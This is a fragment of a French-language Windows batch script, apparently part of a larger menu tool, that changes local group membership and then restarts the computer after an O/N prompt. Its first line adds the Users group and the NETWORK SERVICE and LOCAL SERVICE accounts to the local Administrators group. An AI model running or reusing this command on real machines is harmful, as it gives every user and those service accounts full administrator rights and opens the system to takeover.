net localgroup administrateurs utilisateurs /add networkservice localservice
cls
color 0b
echo ██████████████████████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀███████████████████████
echo █████████████████████  ▲ Attention cette action va redémarrer l'ordinateur ▲  ██████████████████████
echo ██████████████████████▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄███████████████████████
echo.
set /p question=Souhaitez vous continuez [O/N]?
if /i not "%question%"=="O" goto :back
shutdown -r -t 5
goto :end

:back
	call %MAIN_WORKFLOW%

:end
	endlocal
	exit